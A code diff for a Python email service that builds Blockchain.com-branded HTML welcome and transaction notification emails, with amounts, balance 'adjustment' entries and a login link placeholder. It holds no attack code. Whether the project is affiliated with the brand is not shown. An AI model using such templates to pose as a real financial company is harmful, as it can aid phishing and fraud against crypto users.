-                    <p>Your account has been successfully created. Welcome to the world's most trusted cryptocurrency platform.</p>
-                    <p>With Blockchain.com, you can:</p>
-                    <ul>
-                        <li>Securely store your cryptocurrency</li>
-                        <li>Send and receive digital assets</li>
-                        <li>Track your portfolio in real-time</li>
-                        <li>Access institutional-grade security</li>
-                    </ul>
-                    <p style="text-align: center;">
-                        <a href="{login_link}" class="button">Access Your Wallet</a>
-                    </p>
-                    <p>If you have any questions, our support team is available 24/7.</p>
-                    <p>Best regards,<br>The Blockchain.com Team</p>
-                </div>
-                <div class="footer">
-                    <p>© 2024 Blockchain.com. All rights reserved.</p>
-                </div>
-            </div>
-        </body>
-        </html>
-        """
-        
-        return subject, html_body
+        content = f"""
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Welcome to Blockchain.com!</h2>
+    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
+    <p style="color:#555555;margin:0 0 12px 0;">Your account has been successfully created. Welcome to the world's most trusted cryptocurrency platform.</p>
+    <p style="color:#555555;margin:0 0 8px 0;">With Blockchain.com, you can:</p>
+    <ul style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
+      <li style="margin-bottom:4px;">Securely store your cryptocurrency</li>
+      <li style="margin-bottom:4px;">Send and receive digital assets</li>
+      <li style="margin-bottom:4px;">Track your portfolio in real-time</li>
+      <li style="margin-bottom:4px;">Access institutional-grade security</li>
+    </ul>
+    {_btn("Access Your Wallet", login_link)}
+    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
+    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Team</p>"""
+        return subject, _wrap(content)
+
+    # ── Transaction Notification Email ──────────────────────────────────
+    def get_transaction_notification_email(self, user_name: str, tx_type: str, amount: str, asset: str, tx_date: str, description: str = "") -> tuple:
+        subject = f"Transaction Notification - {tx_type.capitalize()} {amount} {asset} - Blockchain.com"
+        type_colors = {"deposit": "#4caf50", "withdrawal": "#d32f2f", "receive": "#4caf50", "send": "#d32f2f", "swap": "#0052ff", "fee": "#f9a825", "adjustment": "#9e9e9e"}
+        color = type_colors.get(tx_type, "#0052ff")
+        sign = "+" if tx_type in ("deposit", "receive") else "-" if tx_type in ("withdrawal", "send") else ""
+        desc_line = f'<p style="color:#888888;font-size:13px;margin:4px 0 0 0;">{html.escape(description)}</p>' if description else ""
+        content = f"""
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Transaction Notification</h2>
+    <p style="color:#555555;margin:0 0 16px 0;">Dear {html.escape(user_name)},</p>
+    <div style="background-color:#f4f4f7;border-radius:8px;padding:20px;margin:16px 0;text-align:center;">
+      <p style="color:#888888;font-size:13px;margin:0 0 4px 0;text-transform:uppercase;">{html.escape(tx_type)}</p>
+      <p style="color:{color};font-size:28px;font-weight:700;margin:0;">{sign}{html.escape(amount)} {html.escape(asset)}</p>
+      {desc_line}
+      <p style="color:#888888;font-size:12px;margin:8px 0 0 0;">{html.escape(tx_date)}</p>
+    </div>
+    <p style="color:#555555;margin:12px 0;">This transaction has been recorded on your account. If you did not authorize this transaction, please contact our support team immediately.</p>
+    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
+    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Team</p>"""
+        return subject, _wrap(content)
 
 
-# Create global instance that will be initialized with env vars
+# Global instance
 email_service = None
 
 def get_email_service():
